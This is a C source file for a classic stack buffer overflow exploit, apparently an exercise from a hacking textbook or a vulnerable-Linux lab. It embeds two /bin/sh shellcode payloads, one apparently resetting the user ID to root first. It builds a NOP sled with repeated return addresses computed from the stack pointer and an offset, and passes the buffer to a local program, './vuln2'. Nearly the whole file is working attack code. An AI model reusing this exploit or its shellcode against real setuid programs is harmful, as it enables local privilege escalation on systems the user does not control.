#include <stdlib.h>

//shellcode from HACKING The art of exploitation
char shellcode2[] =
"\x31\xc0\xb0\x46\31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

//shellcode from DVL
char shellcode1[] =
"\xeb\x25\x5d\x83\xec\x08\x8d\x44\x24\x04\x89\x04\x24\x31\xdb\x89"
"\x5c\x24\x04\x88\x5d\x07\x31\xc0\xb0\x0e\x2c\x03\x89\xeb\x8d\x14"
"\x24\x89\xd1\x31\xd2\xcd\x80\xe8\xd6\xff\xff\xff\x2f\x62\x69\x6e"
"\x2f\x73\x68\x68";

//copy pasteable from
//"\xeb\x25\x5d\x83\xec\x08\x8d\x44\x24\x04\x89\x04\x24\x31\xdb\x89\x5c\x24\x04\x88\x5d\x07\x31\xc0\xb0\x0e\x2c\x03\x89\xeb\x8d\x14\x24\x89\xd1\x31\xd2\xcd\x80\xe8\xd6\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x68";


//helper functions to return current ESP
unsigned long sp(void)
{ __asm__("movl %esp, %eax");}

int main(int argc, char *argv[])
{
        int i, offset;
        long esp, ret, *addr_ptr;
        char *buffer, *ptr;

	
	if (argc == 2) 
	{
		offset = atoi(argv[1]);
        	esp = sp();
	        ret = esp - offset;

        	printf("Stack pointer (ESP): 0x%x\n", esp);
	        printf("Offset from ESP    : 0x%x\n", offset);
	        printf("Desired Return Addr: 0x%x\n", ret);

	        buffer = malloc(600);
        	ptr = buffer;
	        addr_ptr = (long*) ptr;

        	for (i=0; i<600; i+=4)
        	{ 
			*(addr_ptr++) = ret; 
		}

        	for (i=0; i<200; i++)
        	{ 
			buffer[i] = '\x90';
		}

        	ptr = buffer + 200;
        	for(i=0; i < strlen(shellcode2); i++) //use schellcode one
        	{ 
			*(ptr++) = shellcode2[i]; 
		}

        	buffer[600-1] = 0; // '\0'

 		execl("./vuln2", "vuln2", buffer, 0); //vulnerable program

        	free(buffer);
	} else 
	{
		printf("Program need one argument as offset!\n");
	}
		

        return 0;
}

